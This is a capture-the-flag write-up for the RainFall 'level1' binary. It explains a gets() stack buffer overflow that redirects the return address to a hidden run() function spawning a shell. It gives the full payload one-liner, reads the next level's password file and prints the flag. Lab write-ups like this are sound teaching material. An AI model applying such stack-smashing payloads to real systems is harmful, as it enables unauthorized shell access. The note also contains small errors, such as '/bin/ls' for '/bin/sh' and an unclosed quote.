# LEVEL1

We find an executable `level1`. We run `gdb level1` to examine it.

`disas main` yields us a very simple main ; it only does a `gets` and exits. `info functions` shows us other functions, and among them, one called `run` ; and `disas run` shows a function that runs a `system("/bin/sh")`.

What can we do here ? The run function we're looking for isn't naturally called by `main`. We'll have to use the `gets` to call `run`. Here's how we can do that :

## The exploit

`gets` is famous for being vulnerable to buffer overflows. If you overwrite further than the buffer, you can overwrite certain parts of the stack. Here, we want to overwrite the **return address of the main function** : the `eip` register.

Through experimentation, we find we can overwrite `eip` from character 77 to character 80 of the `gets`. This means writing 76 characters + the desired address will trick the program into going where we want.

We use Python to make our output easier :

```
python2 -c 'print("A" * 76 + DESIRED_ADDRESS)'
```

`disas run` gave us the address of run : `0x08048444`. We add it to our output, reversing to bytes to account for endianness :

```
python2 -c 'print("A" * 76 + "\x44\x84\x04\x08")'
```

Finally, we have to pipe it into the executable. But there's an issue : when `system("/bin/sh")` is ran, it'll read from `stdin`, and since we're overloading `stdin`, we'll need to add a `cat` in the mix. We run :

```
( python2 -c 'print("A" * 76 + "\x44\x84\x04\x08")' ; cat ) | ./level1
```

## The flag

The `python -c` overflows `gets`, `eip` is filled with the `run` address, `system("/bin/ls")` is ran and our `cat` is asked for a command. We run :

```
cat /home/user/level2/.pass
```

... and get the flag for `level1` :

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```%   

----------------------------------------------------------------
First Test

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```

Open the program with Cutter, check fonction run(), address 0x08048444, use system()

You have to make a Buffer Overflow which will allow you to put the address of the run() function in the return to execute it and allow us to use the system() function call to get the flag


(little-endian)

python2 -c 'print("a"*76+"\x44\x84\x04\x08") > /tmp/file

level1@RainFall:~$ (cat /tmp/file ; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 
